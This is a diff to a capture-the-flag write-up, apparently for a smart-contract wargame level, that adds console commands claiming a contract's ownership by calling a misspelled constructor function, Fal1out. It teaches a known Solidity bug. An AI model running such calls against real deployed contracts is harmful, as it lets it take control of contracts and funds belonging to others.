@@ -6,5 +6,10 @@ Claim ownership of a contract by exploiting a developer typo. Function fallout()
 
 To solve challange in browser console it is necessary to write:
 ```bash
-
+# We will see current contract owner
+await contract.owner();
+# Calling typo function
+await contract.Fal1out();
+# We will see that we are the owner
+await contract.owner();
 ```
